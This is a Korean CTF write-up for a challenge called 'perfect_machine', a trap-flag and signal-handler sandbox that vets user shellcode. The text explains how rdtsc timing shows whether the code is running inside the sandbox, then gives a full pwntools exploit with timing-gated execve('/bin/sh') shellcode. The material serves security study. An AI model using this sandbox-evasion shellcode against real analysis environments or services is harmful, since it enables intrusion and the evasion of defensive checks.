# perfect_machine

# Usage

# Concept

- sandbox detection

# Writeup

## 컨셉

seccomp 필터를 사용하지 않고, 트랩 게이트와 시그널 핸들러만을 이용해서 구현한 샌드박스를 탐지하는 컨셉의 문제이다. 유저가 입력한 쉘코드는 샌드박스에서 테스트하며 랜덤한 숫자만큼 쉘코드를 돌려서 코드가 안전한지 검사한다. 만약 검사를 통과하면 샌드박스 외부에서 코드를 실행시킨다. 이 때 검사하는 요소는 아래와 같다. 
* 시스템 콜 검사 (`open`, `read`, `write`)
* 모든 범용 레지스터에 `proc`, `flag.txt` 문자열 사용 불가능.
* 샌드박스 외부로 점프 불가능
* eflag의 trap flag 비활성화 불가능
* 샌드박스 내부에서 시스템콜은 실행되지 않고 패스됨
* 민감 데이터는 샌드박스 실행시 PROT_NONE 상태로 매핑됨

코드 테스트는 무작위 횟수만큼 테스트 되는데 이는 단순한 숫자 카운팅으로 샌드박스 내부에서 쉘코드가 실행중인지 판단하여 조건부로 코드를 실행하는 것을 방지하기 위함이다. 

## 취약점
샌드박스는 기본적으로 `SIGTRAP` 시그널을 처리해서 동작하기 때문에 샌드박스 내부 코드 명령어 실행에는 굉장한 오버헤드가 존재한다. 따라서 `rdtsc` 또는 `rdtscp` 명령어를 사용해서 코드가 샌드박스 내부에 있는지 알 수 있다. 그 외에도 가능한 방법은 libc 메모리에 접근하여 랜덤 시드값을 알아내는 방법등이 있을 수 있다. 
## 익스플로잇 코드

```py
from pwn import *
context.arch='amd64'

p = remote('localhost', 15252)
shellcode = f'''
rdtsc
mov rdi, rax
mov rsi, rdx
nop
rdtsc
sub rax, rdi
cmp rax, 0x8500
jl gogo
jmp exit
gogo:
    xor eax, eax;
    push rax;
    mov rdi, 0x68732f6e69622f;
    push rdi;
    mov rdi, rsp;
    xor esi, esi;
    xor edx, edx;
    mov al, 0x3b;
    syscall;
exit:
    ret;
'''
payload = asm(shellcode)
p.sendlineafter(b"> ", payload)
p.interactive()
```
코드에서 `cmp rax, 0x8500` 부분은 시스템 별로 차이가 있을 수 있음. 